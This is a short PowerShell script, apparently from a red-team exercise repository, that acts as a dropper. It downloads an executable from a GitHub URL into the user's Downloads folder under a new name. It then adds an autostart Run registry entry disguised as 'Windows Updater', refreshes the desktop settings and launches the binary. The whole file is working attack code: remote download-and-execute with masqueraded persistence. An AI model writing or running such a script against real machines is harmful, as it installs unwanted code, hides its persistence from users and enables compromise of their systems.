# Exe and Background
$exeUrl = "https://github.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/raw/main/red-scripts/payloads/LETSFUCKINGGO.exe"

# Define the destination paths in the user's Downloads folder
$exePath = "$env:USERPROFILE\Downloads\GumpBit.exe"

# Use WebClient to download the files
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($exeUrl, $exePath)

# Cleanup WebClient
$webClient.Dispose()

# Set the registry keys to run the exe and change the bg
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Updater' -Value $exePath

# Update the background
Start-Process RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

# Run the binary
Start-Process $exePath
